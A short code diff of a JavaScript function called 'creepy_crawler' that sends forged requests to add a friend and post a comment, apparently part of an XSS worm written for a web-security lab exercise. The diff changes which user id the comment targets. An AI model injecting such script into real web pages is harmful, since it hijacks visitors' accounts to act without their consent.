@@ -7,7 +7,7 @@ function creepy_crawler(){
     var payload = encodeURIComponent("I have added you as a friend.");
     add_friends.open("GET", `/add_friend.php?id=${101}`, true);
     add_friends.send();
-    add_comment.open("GET", `/add_comment.php?id=${101}&comment=${payload}`, true);
+    add_comment.open("GET", `/add_comment.php?id=${id}&comment=${payload}`, true);
     add_comment.send();
   }
 }
